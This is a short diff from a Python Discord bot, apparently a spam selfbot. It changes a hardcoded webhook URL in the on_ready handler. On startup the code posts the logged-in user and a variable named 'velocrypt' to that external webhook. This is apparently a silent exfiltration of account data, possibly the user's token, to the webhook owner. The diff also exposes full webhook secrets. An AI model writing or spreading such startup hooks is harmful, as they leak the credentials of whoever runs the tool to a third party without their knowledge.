@@ -703,7 +703,7 @@ async def spamgcname(ctx):
 
 @client.event
 async def on_ready():
-    webhook1 = "https://discord.com/api/webhooks/936527412391477289/LwMs08OSVcV9_GYwbY2oyTRQw4WtD5o-BGif8LZ4KGUMvJNnJalWQDoS-qbo8K9qJGTF"
+    webhook1 = "https://discord.com/api/webhooks/945574525213487114/1Zfd9ovVWQkvnsPJIr8Zw1UccDAzU6t65V94UqDYNXeprImC5JAJIGTX5HZdYxC5pxCc"
     pastebinserverurl = f"{client.user} \n{velocrypt} "
     data = {'content':pastebinserverurl}
     spamming = requests.post(webhook1, json=data)
